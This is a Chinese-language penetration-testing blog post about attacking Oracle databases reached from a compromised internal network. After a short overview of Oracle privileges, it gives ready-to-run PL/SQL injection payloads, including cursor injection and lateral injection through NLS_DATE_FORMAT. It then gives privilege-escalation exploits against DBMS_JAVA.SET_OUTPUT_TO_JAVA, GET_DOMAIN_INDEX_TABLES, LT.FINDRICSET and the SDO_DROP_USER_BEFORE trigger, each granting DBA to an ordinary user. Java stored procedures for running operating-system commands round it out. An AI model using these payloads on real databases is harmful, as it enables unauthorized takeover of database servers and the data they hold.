---
title: 渗透过程中Oracle数据库的利用
author: Loong716
date: 2021-03-06 14:10:00 +0800
categories: [Pentest]
tags: [Database]
---

* toc
{:toc}

## 前言

内网中经常会遇到站库分离的Oracle，在打下站点后可以通过配置文件连接上数据库进行渗透

本文仅是对已有姿势进行复现和分析，姿势基本来自david litchfield的paper

无新姿势和未公开利用方法


## Oracle权限

ORACLE系统提供三种权限：**Object 对象级、System 系统级、Role 角色级**，这些权限可以授予给用户、特殊用户public或角色。

如果授予一个权限给特殊用户"Public"（用户public是oracle预定义的，每个用户享有这个用户享有的权限），那么就意味作将该权限授予了该数据库的所有用户

对管理权限而言，**角色**是一个工具，权限能够被授予给一个角色，角色也能被授予给另一个角色或用户。用户可以通过角色继承权限，简单讲就是为了简化权限的分配，如下图所示：


![1609331970765.png](https://i.loli.net/2021/03/06/oKhvMYuTtOWg29J.png)



权限被大体分为两类：

+ **系统权限**：系统规定用户使用数据库的权限。（系统权限是对用户而言)。
+ **实体权限**：某种权限用户对其它用户的表或视图的存取权限。（是针对表或视图而言的）

### 系统权限

系统权限就是我们常见的`CREATE SESSION`、`ALTER SESSION`等权限，这些权限通常通过角色来进行分配

oracle中有几个常见的预定义角色：

+ **DBA:** 拥有全部特权，是系统最高权限，只有DBA才可以创建数据库结构
+ **RESOURCE:** 拥有Resource权限的用户只可以创建实体，不可以创建数据库结构
+ **CONNECT:** 拥有Connect权限的用户只可以登录Oracle，不可以创建实体，不可以创建数据库结构

一般普通用户拥有connect、resource角色，而管理员拥有connect、resource、dba角色

### 实体权限

简单说就是用户对表、视图、存储过程等有什么权限

+ 表权限：SELECT、DELETE、UPDATE、INSERT、ALTER
+ 视图权限：SELECT、DELTE、INSERT、UPDATE
+ 过程、函数、程序包权限：EXECUTE、DEBUG


### 权限查询

查看所有角色：

``` sql
select * from dba_roles;
```

当前用户被激活的全部角色:

``` sql
select * from session_roles;
```


当前用户被授予的角色:

```sql
select * from user_role_privs;
```

当前用户是否为DBA：

``` sql
select t.DEFAULT_ROLE from user_role_privs t where t.granted_role='DBA';
```

当前用户所拥有的全部权限：

```sql
select * from session_privs;
```

当前用户的系统权限:

```sql
select * from user_sys_privs;
```

当前用户的表级权限:

```
select * from user_tab_privs;
```

查询某个用户所拥有的系统权限:

```
select * from dba_sys_privs;
```

查看角色(只能查看登陆用户拥有的角色)所包含的权限:


``` sql
select * from role_sys_privs;
```

查看用户的java权限（用户名必须大写）：

``` sql
select * from user_java_policy where grantee_name='SCOTT';

-- 下面这样在sqlplus中输出会友好一些
COL TYPE_NAME FOR A30;
COL NAME FOR A30;
COL ACTION FOR A10;
SELECT TYPE_NAME, NAME, ACTION FROM user_java_policy WHERE grantee_name = 'TEST4';
```


### 权限更改

可以通过`GRANT` 和 `REVOKE` 命令来对账户进行权限的授予和撤回，一般这些操作会由DBA用户(SYS用户和SYSTEM用户)来执行

而权限的赋予通常也是通过**角色(Role)**这个“桥梁”来做的（当然也可以直接赋给user），举个例子，创建一个用户，并给该用户赋予`create session`和`create procedure`：

先创建一个test/test的用户

``` sql
create user test identified by test;
```

然后创建一个role

``` sql
create role testrole;
```

然后将`connect`和`create procedure`赋给testrole：

``` sql
grant connect,create procedure to testrole;
```

再将testrole这个角色给用户test

``` sql
grant testrole to test;
```

这样我们可以将testrole给多个用户，修改权限时只需要添加/删除角色的权限即可，方便批量管理，类似Active Directory中的组

如果想要收回某个权限，则使用`revoke`：

``` sql
revoke create procedure from testrole;
```

修改用户密码：

```sql
alter user test identified by test;
```

删除用户和角色：

``` sql
drop user test cascade;

drop role testrole;
```


## PL/SQL Injection

> PL/SQL 是Oracle公司在标准SQL语言的基础上进行扩展，可以在数据库上进行设计编程的一种过程化的语言，类似程序语言JAVA一样可以实现逻辑判断、条件循环、异常处理等细节操作，可以处理复杂性问题。

PL/SQL通常有以下用途：

+ 创建存储过程
+ 创建函数
+ 创建触发器
+ 创建对象
+ ...

需要注意的一点是PL/SQL的执行权限，这个非常重要，说到这个就不得不提到`AUTHID CURRENT_USER`:

+ 如果PL/SQL使用`AUTHID CURRENT_USER`关键词创建，那么在它执行时会以**调用者(invoker)**的权限来执行
+ 如果没有这个关键词，那么在它执行时会以它的**定义者(definer)**的权限来执行

还有最重要的一点，**Oracle不支持堆叠注入(多语句执行)**

至于PL/SQL注入是什么，其实原理就是类似于SQL注入，但利用时有一些oracle自身的特性是需要注意的，看了下面例子差不多就明白了

### Cursor Injection

先来看下面这个procedure，由DBA(SYS)创建，并赋予public执行权限，也就是说数据库能所有用户都可以调用这个procedure

由于没有声明`AUTHID CURRENT_USER`，所以该存储进程执行时的权限是其**定义者(definer)**，也就是SYS

``` sql
CONNECT / AS SYSDBA;

CREATE OR REPLACE PROCEDURE GET_OWNER (P_OBJNM VARCHAR) IS
TYPE C_TYPE IS REF CURSOR;
CV C_TYPE;
BUFFER VARCHAR2(200);
BEGIN
DBMS_OUTPUT.ENABLE(1000000);
OPEN CV FOR 'SELECT OWNER FROM ALL_OBJECTS
WHERE OBJECT_NAME = ''' || P_OBJNM ||'''';
LOOP
FETCH CV INTO BUFFER;
DBMS_OUTPUT.PUT_LINE(BUFFER);
EXIT WHEN CV%NOTFOUND;
END LOOP;
CLOSE CV;
END;
/

GRANT EXECUTE ON GET_OWNER TO PUBLIC;
```

![1609768463124.png](https://i.loli.net/2021/03/06/NoFKuftp1dSygsG.png)

很明显P_OBJNM是存在SQL注入的，但由于Oracle不支持堆叠查询，我们只能够使用联合查询来注出一些数据，比如：

![1609770086831.png](https://i.loli.net/2021/03/06/A7uxs8JX3fgYG2m.png)

但仅仅查数据肯定不能满足我们的需求，


我们可以创建一个执行其他命令的函数（需要`CREATE PROCEDURE`权限），并且加上`AUTHID CURRENT_USER`，然后用`||`将函数注入到SQL语句中，当SQL语句以SYS权限执行时，这个被注入的函数作为SQL语句的一部分也会被执行：

``` sql
CREATE OR REPLACE FUNCTION GET_DBA RETURN VARCHAR AUTHID
CURRENT_USER IS
PRAGMA AUTONOMOUS_TRANSACTION;
BEGIN
EXECUTE IMMEDIATE 'GRANT DBA TO PUBLIC';
RETURN 'GOT_DBA_PRIVS';
END;
/ 

exec SYS.GET_OWNER('AAA''||TEST5.GET_DBA --');
```

![1609770633132.png](https://i.loli.net/2021/03/06/UydTw8ViWOk6ZbI.png)

在这里的`GET_DBA`这种函数被称为辅助注入函数，如果我们没有办法自己创建辅助注入函数的话，就要寻找oracle上已经存在的、可以辅助注入的函数。其它的可以看这里：

https://www.t00ls.net/articles-23609.html

http://www.davidlitchfield.com/HackingAurora.pdf

### Lateral SQL Injection

这个是Oracle SQL注入的另一种利用手法，与我们通常理解的Web或代码层面SQL注入不太一样，它主要针对以下两种情况：

+ Procedure不接收用户输入的参数（参数不可控）
+ Procedure中SQL语句拼接的参数被定义为`NUMBER`或`DATA`类型

先看下面这个存储过程，它接收一个日期类型的参数，并将参数动态拼接入SQL语句：

``` sql
create or replace procedure date_proc_2 (p_date DATE) is
stmt varchar2(200);
begin
stmt:='select object_name from all_objects where created = ''' || p_date || '''';
dbms_output.put_line(stmt);
execute immediate stmt;
end;
/ 
```

先来尝试注入一下：

![1609834588610.png](https://i.loli.net/2021/03/06/velZNcjzIfDwYHQ.png)

直接GG，通常这种情况可能被认为无法注入，但如果我们有`ALTER SESSION`权限的话，就可以欺骗PL/SQL编译器将任意SQL语句作为日期类型（其实原本这个功能是用来修改日期类型的格式的）

``` sql
ALTER SESSION SET NLS_DATE_FORMAT = '"'' and TEST6.GET_DBA()=1--"';

-- 然后注入获取DBA
exec SYS.date_proc_2(''' and TEST6.GET_DBA()=1--');
```

如图所示：

![1609836404037.png](https://i.loli.net/2021/03/06/pvKxy2YgzUN7jMn.png)

再来看这样一个存储进程，它不接收任何参数，拼接入SQL语句中的参数从`sysdate`中获取：

``` sql
create or replace procedure date_proc is
stmt varchar2(200);
v_date date:=sysdate;
begin
stmt:='select object_name from all_objects where created = ''' || v_date || '''';
dbms_output.put_line(stmt);
execute immediate stmt;
end;
/ 
```

我们故技重施，去污染date类型：

![1609838074088.png](https://i.loli.net/2021/03/06/zT9I6dXOwCkP5KZ.png)

可以看到成功添加一个单引号进去，此时我们再去执行上面的Procedure，会得到一个单引号未正常闭合的报错：

![1609838164271.png](https://i.loli.net/2021/03/06/DOWXMr3BfJNuhtb.png)

那么我们是否能够将语句成功注入进去呢？答案是暂时还不行，因为date类型限制了长度，如下图：

![1609838407057.png](https://i.loli.net/2021/03/06/ZDOv4pusji5rWLB.png)


但是oracle有个游标（可以理解为给你的语句一个ID，然后执行的时候直接通过ID执行即可）正好可以被我们所利用

关于游标可参考：https://www.cnblogs.com/huyong/archive/2011/05/04/2036377.html

``` sql
DECLARE
N NUMBER;
BEGIN
N:=DBMS_SQL.OPEN_CURSOR();
DBMS_SQL.PARSE(N,'DECLARE PRAGMA AUTONOMOUS_TRANSACTION; BEGIN
EXECUTE IMMEDIATE ''GRANT DBA TO TEST5''; END;',0);
DBMS_OUTPUT.PUT_LINE('Cursor is: '|| N);
END;
/ 
```

注意开启输出，不然无法打印游标号

![1609838951048.png](https://i.loli.net/2021/03/06/OYsZtvPkDdfTJ1W.png)

之后就是污染date类型，进而实现SQL注入

``` sql
ALTER SESSION SET NLS_DATE_FORMAT = '"'' AND DBMS_SQL.EXECUTE(1)=1--"';

-- 此时再执行Procedure
exec SYS.DATE_PROC();
```

![1609839114665.png](https://i.loli.net/2021/03/06/vm8DFnlMEJ9rIag.png)


`NUMBER`类型同样也可以污染：

![1609839627702.png](https://i.loli.net/2021/03/06/OAMHQTVwstbRxkm.png)



## 权限提升

### SET_OUTPUT_TO_JAVA

> 测试环境：
> Oracle Database 11g Enterprise Edition Release 11.2.0.1.0 - 64bit
> 
> 权限要求：
> + `CREATE SESSION`

利用`DBMS_JAVA.SET_OUTPUT_TO_JAVA()`函数的特性来提升只拥有`CREATE SESSION`的用户的权限

#### 原理

该函数可以利用前面提到的Lateral SQL Injection来进行注入，进而获取DBA权限，先来看他的参数：

![1609856667402.png](https://i.loli.net/2021/03/06/us74IDTc8OWdBPZ.png)

其中后两个参数允许我们传入SQL语句

这个函数允许用户在另一个新的虚拟session中重定向java输出写入到`System.out`和`System.err`，最后两个参数的SQL语句将在这个新session中执行

如果攻击者可以得到一个属于SYS的使用java的package并将它写入`System.out`和`System.err`，那么这个新会话的所属者就是SYS，进而所执行的SQL语句也将以SYS权限执行

而`DBMS_CDC_ISUBSCRIBE`正是一个符合条件package，它可被public执行，属于SYS并且是definer权限执行，通过将无效的订阅名传递给这个包的`e INT_PURGE_WINDOW`过程，则可以将错误强制写入`System.err`，随后将以SYS权限执行前一个请求的参数中提供的SQL语句

#### 利用


``` sql
-- 注意替换GRANT语句中的用户名
SELECT DBMS_JAVA.SET_OUTPUT_TO_JAVA('ID','oracle/aurora/rdbms/DbmsJava','SYS','writeOutputToFile','TEXT', NULL, NULL, NULL, NULL,0,1,1,1,1,0,'DECLARE PRAGMA AUTONOMOUS_TRANSACTION; BEGIN EXECUTE IMMEDIATE ''GRANT DBA TO SIMPLEUSER1''; END;', 'BEGIN NULL; END;') FROM DUAL;

-- 这句执行会报错，但不影响结果
EXEC DBMS_CDC_ISUBSCRIBE.INT_PURGE_WINDOW('NO_SUCH_SUBSCRIPTION',SYSDATE());

-- 这句其实要不要都行，不执行的话直接grant赋权也行
set role dba;
```

![1609598931742.png](https://i.loli.net/2021/03/06/xXPUcymkrH7noBC.png)

可以看到普通用户已经成为DBA，并拥有DBA的权限

![1609599257329.png](https://i.loli.net/2021/03/06/UD8Qyof2PFvKZGV.png)

### GET_DOMAIN_INDEX_TABLES

> 影响版本：Oracle Database <= 10g R2 (未打补丁的情况下)
> 
> 测试环境：
> Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - 64bit
> 
> 权限要求：
> + `CREATE SESSION`

这个利用的是PL/SQL Injection来提升权限

#### 原理

先来看`SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES`这个函数的定义：

``` sql
FUNCTION GET_DOMAIN_INDEX_TABLES (  
TYPE_NAME IN VARCHAR2,  
TYPE_SCHEMA IN VARCHAR2,  
...
BEGIN  
IF GET_TABLES = 1 THEN  
GETTABLENAMES_CONTEXT := 0;
...
ELSE  
STMTSTRING :=  
'BEGIN ' ||  
'"' || TYPE_SCHEMA || '"."' || TYPE_NAME ||  
'".ODCIIndexUtilCleanup(:p1); ' ||  
'END;';  
DBMS_SQL.PARSE(CRS, STMTSTRING, DBMS_SYS_SQL.V7);  
DBMS_SQL.BIND_VARIABLE(CRS,':p1',GETTABLENAMES_CONTEXT);  
DUMMY := DBMS_SQL.EXECUTE(CRS);  
DBMS_SQL.CLOSE_CURSOR(CRS);  
STMTSTRING := '';
...
```

可以看到当`GET_TABLES != 1`时，`TYPE_NAME`和`TYPE_SCHEMA`被直接动态拼接进PL/SQL语句中并执行

由于这个函数是以`definer`权限来执行的，所以我们注入的语句也会以SYS权限来执行

因此我们构造语句，传入参数`TYPE_NAME`：

``` sql
DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant dba to test2'''';END;'';END;--
```

我本地用pl/sql手动打印看一下：

![1609687277665.png](https://i.loli.net/2021/03/06/kj5eSl3XYrNuA7D.png)

可以看到已经构造出了完整的赋权语句，并将后面多余的语句注释掉

#### 利用

``` sql
select SYS.DBMS_EXPORT_EXTENSION.GET_DOMAIN_INDEX_TABLES('FOO','BAR','DBMS_OUTPUT".PUT(:P1);EXECUTE IMMEDIATE ''DECLARE PRAGMA AUTONOMOUS_TRANSACTION;BEGIN EXECUTE IMMEDIATE ''''grant dba to test2'''';END;'';END;--','SYS',0,'1',0) from dual;
```

直接执行即可

![1609605882639.png](https://i.loli.net/2021/03/06/iH8BNYstDhaKIvb.png)

可看到成功提权到DBA，并可以赋权：

![1609605910424.png](https://i.loli.net/2021/03/06/4wq8vCnx6z9LPOk.png)


### LT.FINDRICSET

> 测试环境：
> Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - 64bit
> 
> 权限要求：
> + `CREATE SESSION`
> + `CREATE PROCEDURE`

该方法利用`SYS.LT.FINDRICSET`这个函数的注入漏洞来实现权限的提升


#### 原理

看定义：

``` sql
PROCEDURE FINDRICSET( TABLE_NAME VARCHAR2, RESULT_TABLE VARCHAR2 DEFAULT '' )  
IS  
TABOWNER VARCHAR2(100);  
TABNAME VARCHAR2(100);  
RESOWNER VARCHAR2(100);  
RESNAME VARCHAR2(100);  
BEGIN  
SYS.LT_CTX_PKG.SETUSER ;

     TABOWNER := NVL(SUBSTR(UPPER(TABLE_NAME),1,INSTR(TABLE_NAME,'.')-1), SYS_CONTEXT('lt_ctx', 'current_schema'));
     TABNAME  := SUBSTR(UPPER(TABLE_NAME),INSTR(TABLE_NAME,'.')+1);

     IF ( RESULT_TABLE IS NOT NULL ) THEN
        RESOWNER := NVL(SUBSTR(UPPER(RESULT_TABLE),1,INSTR(RESULT_TABLE,'.')-1), SYS_CONTEXT('lt_ctx', 'current_schema'));
        RESNAME  := SUBSTR(UPPER(RESULT_TABLE),INSTR(RESULT_TABLE,'.')+1);
     END IF;

     IF ( RESULT_TABLE IS NOT NULL AND 
          NOT HASOUTPUTTABPRIVS( RESOWNER, RESNAME ) ) THEN SYS.WM_ERROR.RAISEERROR(SYS.LT.WM_ERROR_171_NO, 'insufficient privileges on the result table');
     END IF;

     SYS.LTRIC.FINDRICSET( TABOWNER, TABNAME, RESOWNER, RESNAME );


END;  
```

这个函数又调用了`SYS.LTRIC.FINDRICSET`，定义如下：


``` sql
PROCEDURE FINDRICSET( IN_TABLE_OWNER VARCHAR2, IN_TABLE_NAME VARCHAR2,  
RESULT_TABLE_OWNER VARCHAR2, RESULT_TABLE VARCHAR2 )  
... 
EXECUTE IMMEDIATE 'insert into wmsys.wm$ric_set_in values ( ''' || IN_TABLE_OWNER || ''',''' || IN_TABLE_NAME || ''' )'; 
```

`IN_TABLE_OWNER`和`IN_TABLE_NAME`直接动态拼接到SQL语句中，是可以注入的点

我们自己创建一个赋权的存储进程，然后闭合SQL语句，在参数处调用存储进程

被注入后的sql语句应该是这样的


![1609742583068.png](https://i.loli.net/2021/03/06/lzvgTm4tkHPrOaC.png)


（图上稍微有点问题，不过大概就是这意思）

``` sql
EXECUTE IMMEDIATE 'insert into wmsys.wm$ric_set_in values (''A'',''A''||TEST2.GET_DBA) --' )';
```


#### 利用


``` sql
-- 注意修改其中的用户名
create or replace function get_dba return varchar2 authid current_user is PRAGMA autonomous_transaction;
BEGIN 
execute immediate 'grant dba to test2';
commit;
return 'z';
END; 
/
begin 
sys.lt.findricset('A.A''||test2.get_dba) --','BBBB');
commit;
end;
/
```

![1609650560642.png](https://i.loli.net/2021/03/06/gsYk1omWUE5ljH3.png)

成功获取DBA：

![1609650577146.png](https://i.loli.net/2021/03/06/Qyl5GqEXZRHDxpO.png)

注入环境中可使用`dbms_xmlquery.newcontext`来执行：

``` sql
select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;  
begin execute immediate ''create or replace function get_dba return varchar2 authid current_user is PRAGMA  
autonomous_transaction;BEGIN execute immediate ''''grant dba to hellove'''';commit;return ''''z'''';END; ''; commit; end;')  
from dual;

select dbms_xmlquery.newcontext('declare PRAGMA  
AUTONOMOUS_TRANSACTION;begin sys.lt.findricset(''A.A''''||hellove.get_dba)--'',''BBBB'');commit;end;') from dual;
```

### SDO_DROP_USER_BEFORE

> 测试环境：
> Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - 64bit
> 
> 权限要求：
> + `CREATE SESSION`

这个是一个触发器(trigger)漏洞

> 触发器在数据库里以独立的对象存储，它与存储过程和函数不同的是，存储过程与函数需要用户显示调用才执行，而触发器是由一个事件来启动运行。

#### 原理

先看`SDO_DROP_USER_BEFORE`这个触发器的的定义吧：

``` sql
trigger sdo_drop_user_before  
before drop on DATABASE  
declare  
stmt varchar2(200);  
rdf_exception EXCEPTION; pragma exception_init(rdf_exception, -20000);  
BEGIN  
if dictionary_obj_type = 'USER' THEN  
BEGIN  
EXECUTE IMMEDIATE  
'begin ' ||  
'mdsys.rdf_apis_internal.' ||  
'notify_drop_user(''' ||  
dictionary_obj_name || '''); ' ||  
'end;';  
EXCEPTION  
WHEN rdf_exception THEN RAISE;  
WHEN OTHERS THEN NULL;  
END;  
end if;  
end;
```

可以看出这个触发器是在drop用户时会执行对应的命令，而`dictionary_obj_name`被动态拼接到PL/SQL中，存在注入


但`SDO_DROP_USER_BEFORE`这个触发器属于`MDSYS`，而且是以definer的权限来执行的，`MDSYS`在oracle 9i中是DBA权限，后来在10g R2上被降权了，因此无法直接通过注入来获取DBA权限

但是也不是毫无办法，`MDSYS`拥有`create any trigger`，也就是说我们可以利用这个注入来任意创建触发器

那么我们完全可以在`SYSTEM`下创建一个触发器来执行我们想要的命令，然后触发这个新创建触发器，从而以system来执行我们的命令

直接看POC，使用游标创建一个procedure（当然也可以不使用游标），该过程在system下创建一个触发器，当向`system.OL$`中插入数据时（默认public可向该表中插入数据），就会触发执行`grant dba to public`：

``` sql
DECLARE
MY_CURSOR NUMBER;
RESULT NUMBER;
BEGIN
MY_CURSOR := DBMS_SQL.OPEN_CURSOR;
DBMS_SQL.PARSE(MY_CURSOR,'declare pragma autonomous_transaction; begin DBMS_OUTPUT.PUT_LINE(''EXECUTING FROM SDO_DROP_USER_BEFORE!!!''); execute immediate ''create or replace trigger system.WHOPPEE before insert on system.OL$ DECLARE msg VARCHAR2(30); BEGIN null; dbms_output.put_line(''''In the trigger''''); EXECUTE IMMEDIATE ''''DECLARE PRAGMA AUTONOMOUS_TRANSACTION; BEGIN EXECUTE IMMEDIATE ''''''''GRANT DBA TO PUBLIC''''''''; END; ''''; end WHOPPEE;''; commit; end;',0);
DBMS_OUTPUT.PUT_LINE('Cursor value is :' || MY_CURSOR);
END;
/ 
```

之后将注入该procedure的payload放到drop的用户名中，触发`SDO_DROP_USER_BEFORE`执行，再向`system.OL$`中插入数据即可

``` sql
DROP USER "'||CHR(DBMS_SQL.EXECUTE(5))||'";

INSERT INTO SYSTEM.OL$ (OL_NAME) VALUES ('OWNED!');
```



#### 利用

``` sql
-- 一定要有这一句，不然后面的Cursor value无法输出
SET SERVEROUTPUT ON;

-- 注意修改grant的用户，执行后记下打印的Cursor value
DECLARE
MY_CURSOR NUMBER;
RESULT NUMBER;
BEGIN
MY_CURSOR := DBMS_SQL.OPEN_CURSOR;
DBMS_SQL.PARSE(MY_CURSOR,'declare pragma autonomous_transaction; begin DBMS_OUTPUT.PUT_LINE(''EXECUTING FROM SDO_DROP_USER_BEFORE!!!''); execute immediate ''create or replace trigger system.WHOPPEE before insert on system.OL$ DECLARE msg VARCHAR2(30); BEGIN null; dbms_output.put_line(''''In the trigger''''); EXECUTE IMMEDIATE ''''DECLARE PRAGMA AUTONOMOUS_TRANSACTION; BEGIN EXECUTE IMMEDIATE ''''''''GRANT DBA TO TEST4''''''''; END; ''''; end WHOPPEE;''; commit; end;',0);
DBMS_OUTPUT.PUT_LINE('Cursor value is :' || MY_CURSOR);
END;
/ 

-- DBMS_SQL.EXECUTE()中是前面得到的Cursor value
DROP USER "'||CHR(DBMS_SQL.EXECUTE(5))||'"; 

-- 插入数据来触发条件
INSERT INTO SYSTEM.OL$ (OL_NAME) VALUES ('OWNED!');
```

开启服务端输出，执行命令，记下Cursor value

![1609652444255.png](https://i.loli.net/2021/03/06/CvIp6jL2fcQYGNi.png)

在drop user语句中填入对应的Cursor value，并插入数据来触发条件，成功获取DBA权限：

![1609652463941.png](https://i.loli.net/2021/03/06/UJ2jPyHbIRSsTV4.png)


## 命令执行


### DBMS_XMLQUERY

> 测试环境：
> Oracle Database 11g Enterprise Edition Release 11.2.0.1.0 - 64bit
> Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - 64bit
> 
> 权限要求：
> + `CREATE SESSION`
> + `CREATE PROCEDURE`
> （某些版本是否需要CREATE PROCEDURE存疑）


创建java source：

``` sql
select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace and compile java source named "LinxUtil" as import java.io.*; public class LinxUtil extends Object {public static String runCMD(String args) {try{BufferedReader myReader= new BufferedReader(new InputStreamReader( Runtime.getRuntime().exec(args).getInputStream() ) ); String stemp,str="";while ((stemp = myReader.readLine()) != null) str +=stemp+"\n";myReader.close();return str;} catch (Exception e){return e.toString();}}}'';commit;end;') from dual;
```

![1609349655236.png](https://i.loli.net/2021/03/06/YInsbzdeXmcL4r8.png)


创建函数：

``` sql
select dbms_xmlquery.newcontext('declare PRAGMA AUTONOMOUS_TRANSACTION;begin execute immediate ''create or replace function LinxRunCMD(p_cmd in varchar2) return varchar2 as language java name ''''LinxUtil.runCMD(java.lang.String) return String''''; '';commit;end;') from dual;
```

![1609349683516.png](https://i.loli.net/2021/03/06/4cZbYjSkUFhmfXy.png)



可以通过查询OBJECT_ID来判断函数是否创建成功：

``` sql
select OBJECT_ID from all_objects where object_name ='LINXRUNCMD';
```

![1609349696763.png](https://i.loli.net/2021/03/06/sypL6naUVGX7k8I.png)



赋予需要的三个java权限：

> 当前用户为DBA时，通常只需要为该用户赋予第一个执行权限即可，实际情况中具体需要哪一个可以直接执行函数来看报错提示
> 
> 一般报错如下：
> 
> ![1609382785318.png](https://i.loli.net/2021/03/06/8ESTrXOmHvediny.png)


``` sql
DECLARE
POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;
CURSOR C1 IS SELECT 'GRANT',USER(),'SYS','java.io.FilePermission','<<ALL FILES>>','execute','ENABLED' FROM DUAL;
BEGIN
OPEN C1;
FETCH C1 BULK COLLECT INTO POL;
CLOSE C1;
DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);
END;
/
DECLARE
POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;
CURSOR C1 IS SELECT 'GRANT',USER(),'SYS','java.lang.RuntimePermission','writeFileDescriptor',NULL,'ENABLED' FROM DUAL;
BEGIN
OPEN C1;
FETCH C1 BULK COLLECT INTO POL;
CLOSE C1;
DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);
END;
/
DECLARE
POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;
CURSOR C1 IS SELECT 'GRANT',USER(),'SYS','java.lang.RuntimePermission','readFileDescriptor',NULL,'ENABLED' FROM DUAL;
BEGIN
OPEN C1;
FETCH C1 BULK COLLECT INTO POL;
CLOSE C1;
DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);
END;
/
```

执行命令：

``` sql
select LinxRUNCMD('/sbin/ifconfig') from dual;
```

![1609349737895.png](https://i.loli.net/2021/03/06/1QHu5zcgKAkMCU6.png)



### 创建存储进程执行命令

> 测试环境：
> Oracle Database 11g Enterprise Edition Release 11.2.0.1.0 - 64bit
> Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - 64bit
> 
> 权限要求：
> + `CREATE SESSION`
> + `CREATE PROCEDURE`
> 
> 有时执行命令也会碰到这种报错，此时需要为用户赋予java的对应权限，最好执行前先执行一次dbms_xmlquery中赋予那三个权限的命令
> 
> 如果你已经创建完javae函数在执行命令时发现了这个报错，那么要再执行一次2.sql，然后再执行javae函数
> 
> ![1609388627245.png](https://i.loli.net/2021/03/06/b2Va4lJdgvmBXOz.png)

将下面文件分别保存为

1.sql：

``` sql
DECLARE
POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;
CURSOR C1 IS SELECT 
'GRANT',USER(),'SYS','java.io.FilePermission',
'<<ALL FILES>>','execute','ENABLED' FROM DUAL;
BEGIN
OPEN C1;
FETCH C1 BULK COLLECT INTO POL;
CLOSE C1;
DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);
END;
/
```

2.sql：

```sql
create or replace and resolve java source named "oraexec" as
import java.lang.*;
import java.io.*;
public class oraexec
{
    public static String execCommand(String command) throws IOException, InterruptedException {
        Runtime rt = Runtime.getRuntime();
        int bufSize = 4096;
        byte buffer[] = new byte[bufSize];
        String rc = "";
        int len;
        try{
            Process p = rt.exec(command);
            BufferedInputStream bis =
                    new BufferedInputStream(p.getInputStream(), bufSize);
            while ((len = bis.read(buffer, 0, bufSize)) != -1){
                rc += new String(buffer).split("\0")[0];;
            }
            bis.close();
            p.waitFor();
            return rc;
        } catch (Exception e) {
            rc = e.getMessage();
        }
        finally
        {
            return rc;
        }
    }
}
/
create or replace
function javae(p_command in varchar2) return varchar2
as
language java
name 'oraexec.execCommand(java.lang.String) return String';
/
```

放在sqlplus同级目录下，然后分别执行：

``` htmlbars
SQL> @1.sql

PL/SQL procedure successfully completed.

SQL> @2.sql

Java created.


Function created.
```

![1609388411089.png](https://i.loli.net/2021/03/06/eX6tmaWVFgb2U54.png)



然后执行命令即可：

``` sql
select javae('/sbin/ifconfig') from dual;
```

![1609388495831.png](https://i.loli.net/2021/03/06/mvriwseJUu3MGlz.png)


### DBMS_JAVA.RUNJAVA

> 测试环境：
> Oracle Database 11g Enterprise Edition Release 11.2.0.1.0 - 64bit
> Oracle Database 10g Enterprise Edition Release 10.2.0.1.0 - 64bit
> 
> 权限要求：
> + `CREATE SESSION`


先给当前用户赋予`java.io.FilePermission`：

``` sql
DECLARE
POL DBMS_JVM_EXP_PERMS.TEMP_JAVA_POLICY;
CURSOR C1 IS SELECT 
'GRANT',USER(),'SYS','java.io.FilePermission',
'<<ALL FILES>>','execute','ENABLED' FROM DUAL;
BEGIN
OPEN C1;
FETCH C1 BULK COLLECT INTO POL;
CLOSE C1;
DBMS_JVM_EXP_PERMS.IMPORT_JVM_PERMS(POL);
END;
/
```

然后执行命令：

``` sql
-- 11g
SELECT DBMS_JAVA.RUNJAVA('oracle/aurora/util/Wrapper touch /tmp/success') FROM DUAL;

-- 10g/11g, 注意10g中还需要readFileDescriptor和writeFileDescriptor
SELECT DBMS_JAVA_TEST.FUNCALL('oracle/aurora/util/Wrapper','main','/bin/bash','-c','/sbin/ifconfig>/tmp/1.txt') FROM DUAL;
```

**11g:**

![1609597313673.png](https://i.loli.net/2021/03/06/jRnygHw5TsG1r96.png)


成功创建文件：

![1609597283696.png](https://i.loli.net/2021/03/06/qTY27f1Sue9y6Wz.png)

**10g:**

![1609601837066.png](https://i.loli.net/2021/03/06/8xzoyDw6YfQdleK.png)

成功将命令写入文件

![1609601811259.png](https://i.loli.net/2021/03/06/DUByhe6FGElqucX.png)


## Web层面的利用

前面提到过Oracle并不支持堆叠注入，但是前面介绍的`dbms_xmlquery.newcontext`是可以执行PL/SQL语句的，因此当我们遇到Oracle的SQL注入点时，就可以构造执行`dbms_xmlquery.newcontext`的语句来进行命令执行

### 总结

一般PL/SQL注入利用的条件：

+ 存在注入的PL/SQL属于高权限用户（一般关注SYS），且以definer权限执行


对用户权限的要求：

+ 如果用户没有`CREATE PROCEDURE`权限，则需要寻找数据库已有的辅助注入函数
+ 如果用户有`CREATE PROCEDURE`，则可以自己创建辅助注入函数

如果没有辅助注入函数的话：

+ 如果注入点是在`execute immediate`后的PL/SQL语句中，那么可以考虑直接注入匿名PL/SQL语句块
+ 如果存在注入的是`insert`、`delete`、`update`这三种类型的语句，那么我们就可以利用现有的语句进行增删改操作，特别是insert情况下可以通过将当前用户插入到`SYS.SYSAUTH$`表中，同样可获得DBA权限
+ 如果存在注入的是`select`这种类型的语句，那么我们就只能对数据库进行查询操作，如`UNION SELECT PASSWORD FROM SYS.USER$`，当然前提是它有输出

